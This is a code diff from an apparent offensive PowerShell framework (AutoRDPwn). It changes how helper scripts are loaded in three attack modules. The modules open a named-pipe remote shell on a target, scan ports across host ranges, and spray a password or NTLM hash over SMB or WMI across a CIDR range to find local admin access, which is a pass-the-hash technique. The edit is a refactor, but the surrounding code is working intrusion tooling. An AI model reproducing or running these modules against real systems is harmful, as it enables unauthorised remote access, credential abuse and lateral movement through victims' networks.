@@ -23,7 +23,7 @@ function Invoke-ARModulePipeShell {
             } -ArgumentList $path | Out-Null
         } -ErrorAction Stop | Out-Null
     }
-    Import-ARFunctionScript 'Resources\Scripts\Invoke-PipeShell.ps1'
+    . (Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1')
     Write-ARInfo 'Named pipe server started on the target.'
     Invoke-PipeShell -mode client -server $target -aeskey AutoRDPwn_AESKey -i -pipe 'NamedPipeStream' -timeout 120
     Set-ARStatus 'Named pipe shell closed' 'Ok'
@@ -215,7 +215,7 @@ function Invoke-ARModulePortScan {
     $oldProgress = $ProgressPreference
     $ProgressPreference = 'Continue'
     try {
-        Import-ARFunctionScript 'Resources\Scripts\Invoke-Portscan.ps1'
+        . (Get-ARResourcePath 'Resources\Scripts\Invoke-Portscan.ps1')
         Invoke-Portscan -Hosts $range -Threads $threads -TopPorts $ports
     }
     finally { $ProgressPreference = $oldProgress }
@@ -319,14 +319,14 @@ function Invoke-ARModuleCredScan {
     $method = $method.ToLowerInvariant()
     if ($method -like 'pass*' -or $method -like 'contra*') {
         $plain = Read-ARSecret 'Password'
-        Import-ARFunctionScript 'Resources\Scripts\Get-NTLM.ps1'
+        . (Get-ARResourcePath 'Resources\Scripts\Get-NTLM.ps1')
         $hash = Get-NTLM $plain
     }
     else {
         $hash = Read-ARValue (Get-ARText 'txt84' 'Enter the NTLM Hash')
     }
     $protocol = Read-ARValue (Get-ARText 'txt85' 'Enter the protocol you want to use (SMB / WMI)') 'SMB'
-    Import-ARFunctionScript 'Resources\Scripts\Check-LocalAdminHash.ps1'
+    . (Get-ARResourcePath 'Resources\Scripts\Check-LocalAdminHash.ps1')
     Check-LocalAdminHash -Username $user -PasswordHash $hash -CIDR $range -Protocol $protocol -Threads 20
     Set-ARStatus 'Credential scan finished' 'Ok'
 }
